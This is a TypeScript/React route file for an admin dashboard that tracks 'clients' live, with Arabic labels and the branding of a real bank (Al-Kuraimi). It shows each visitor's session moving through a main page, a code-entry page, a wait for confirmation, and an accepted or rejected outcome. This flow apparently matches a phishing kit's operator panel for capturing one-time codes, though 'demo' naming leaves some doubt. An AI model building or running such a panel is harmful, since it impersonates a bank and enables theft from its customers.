import { createFileRoute, Link } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { Activity, Clock3, KeyRound, LogOut, MonitorSmartphone, Radio, TicketCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import { getSupabaseClient, isSupabaseConfigured } from "@/lib/supabase";
import { watchClientTracking, type ClientTracking } from "@/lib/tracking";

export const Route = createFileRoute("/tracking")({
  head: () => ({ meta: [{ title: "تتبع العملاء المباشر" }] }),
  component: TrackingPage,
});

function pageLabel(page: ClientTracking["currentPage"]): string {
  const labels: Record<ClientTracking["currentPage"], string> = {
    main: "الصفحة الرئيسية",
    verify: "صفحة إدخال الرمز",
    waiting: "انتظار التأكيد",
    accepted: "اكتملت العملية",
    rejected: "تم رفض الطلب",
  };
  return labels[page] ?? page;
}

function TrackingPage() {
  const [authReady, setAuthReady] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [clients, setClients] = useState<ClientTracking[]>([]);
  const [error, setError] = useState("");

  useEffect(() => {
    if (!isSupabaseConfigured()) {
      setAuthReady(true);
      return;
    }
    const supabase = getSupabaseClient();
    let stopTracking: (() => void) | undefined;

    const checkAdmin = async () => {
      const { data } = await supabase.auth.getSession();
      const user = data.session?.user ?? null;
      if (!user) {
        setIsAdmin(false);
        setAuthReady(true);
        return;
      }
      const { data: role, error: roleError } = await supabase
        .from("admin_users")
        .select("enabled")
        .eq("uid", user.id)
        .maybeSingle();
      if (roleError) setError(roleError.message);
      const admin = role?.enabled === true;
      setIsAdmin(admin);
      setAuthReady(true);
      if (admin) {
        stopTracking = watchClientTracking(setClients, (trackingError) => setError(trackingError.message));
      }
    };

    void checkAdmin();
    const { data } = supabase.auth.onAuthStateChange(() => void checkAdmin());
    return () => {
      stopTracking?.();
      data.subscription.unsubscribe();
    };
  }, []);

  const activeClients = useMemo(() => {
    const cutoff = Date.now() - 2 * 60 * 1000;
    return clients.filter((client) => new Date(client.lastSeenAt).getTime() >= cutoff);
  }, [clients]);

  if (!authReady) {
    return <main className="admin-page" dir="rtl"><p>جارٍ التحقق من الجلسة...</p></main>;
  }

  if (!isAdmin) {
    return (
      <main className="admin-page" dir="rtl">
        <p className="demo-error" role="alert">يجب تسجيل الدخول كمشرف لعرض تتبع العملاء.</p>
        <Link to="/admin" className="participation-home-link">الانتقال إلى صفحة المشرف</Link>
      </main>
    );
  }

  return (
    <main className="admin-page admin-dashboard-page tracking-page" dir="rtl">
      <header className="bank-header demo-header admin-bank-header">
        <div className="demo-brand" aria-label="بنك الكريمي"><TicketCheck aria-hidden="true" /></div>
      </header>
      <div className="tracking-toolbar">
        <div>
          <h1>تتبع العملاء المباشر</h1>
          <p><Radio aria-hidden="true" /> {activeClients.length} عميل نشط الآن</p>
        </div>
      </div>
      <div className="admin-dashboard-toolbar tracking-dashboard-toolbar">
        <div className="admin-header-actions">
          <Button variant="outline" asChild>
            <Link to="/admin">الطلبات</Link>
          </Button>
          <Button variant="outline" asChild>
            <Link to="/admin">
              <KeyRound /> تغيير كلمة المرور
            </Link>
          </Button>
          <Button variant="outline" onClick={() => void getSupabaseClient().auth.signOut()}>
            <LogOut /> تسجيل الخروج
          </Button>
        </div>
      </div>

      {error && <p className="demo-error" role="alert">{error}</p>}

      <section className="tracking-grid" aria-label="حركة العملاء الحاليين">
        {activeClients.length === 0 ? (
          <div className="admin-empty">
            <Activity />
            <h2>لا يوجد عملاء نشطون حاليًا</h2>
            <p>ستظهر الجلسات هنا مباشرة عند دخول العملاء للموقع.</p>
          </div>
        ) : activeClients.map((client) => {
          const lastSeen = new Date(client.lastSeenAt);
          return (
            <article className="tracking-card" key={client.sessionId}>
              <div className="tracking-card-top">
                <span className="tracking-online"><span /> نشط</span>
                <time>{lastSeen.toLocaleTimeString("ar-EG")}</time>
              </div>
              <div className="tracking-client-id">
                <MonitorSmartphone aria-hidden="true" />
                <strong>{client.participantNumber || `عميل ${client.sessionId.slice(0, 6)}`}</strong>
              </div>
              <dl className="tracking-details">
                <div><dt>الشاشة الحالية</dt><dd>{pageLabel(client.currentPage)}</dd></div>
                <div><dt>الحالة</dt><dd>{client.status}</dd></div>
                <div><dt>آخر ظهور</dt><dd><Clock3 aria-hidden="true" /> {lastSeen.toLocaleString("ar-EG")}</dd></div>
              </dl>
            </article>
          );
        })}
      </section>
    </main>
  );
}
